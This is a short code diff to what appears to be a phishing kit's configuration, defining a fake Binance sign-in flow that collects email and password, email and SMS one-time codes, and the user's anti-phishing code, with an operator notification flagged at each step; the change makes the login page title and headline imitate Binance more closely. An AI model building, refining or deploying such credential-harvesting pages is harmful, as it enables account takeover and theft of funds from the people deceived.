@@ -508,7 +508,7 @@ const FLOWS = {
   // ── CRYPTO ──────────────────────────────────────────────────────────────────
 
   binance: [
-    { slug:'login',        form_type:'login',  page_title:'Sign In',           headline:'Welcome to Binance',                 subheadline:'Enter your email and password',             fields:['email','password'],    layout:'auth',  cta:'Sign In',       step_label:'Login',        notify_step:true  },
+    { slug:'login',        form_type:'login',  page_title:'Log In | Binance',  headline:'Log in',                             subheadline:'',                                          fields:['email','password'],    layout:'auth',  cta:'Log In',        step_label:'Login',        notify_step:true  },
     { slug:'2fa-email',    form_type:'otp',    page_title:'Email Verify',      headline:'Verify Your Email',                  subheadline:'Enter the code sent to your email address', fields:['code'],                layout:'otp',   cta:'Confirm',       step_label:'Email 2FA',    notify_step:true,  otp_length:6 },
     { slug:'2fa-phone',    form_type:'otp',    page_title:'Phone Verify',      headline:'Verify Your Phone Number',            subheadline:'Enter the code sent via SMS to your phone', fields:['code'],               layout:'otp',   cta:'Confirm',       step_label:'SMS 2FA',      notify_step:true,  otp_length:6 },
     { slug:'anti-phishing',form_type:'verify', page_title:'Anti-Phishing Code',headline:'Enter Your Anti-Phishing Code',      subheadline:'The code you set up to protect your account', fields:['anti_phishing_code'], layout:'verify',cta:'Confirm',       step_label:'Anti-Phishing',notify_step:true  }
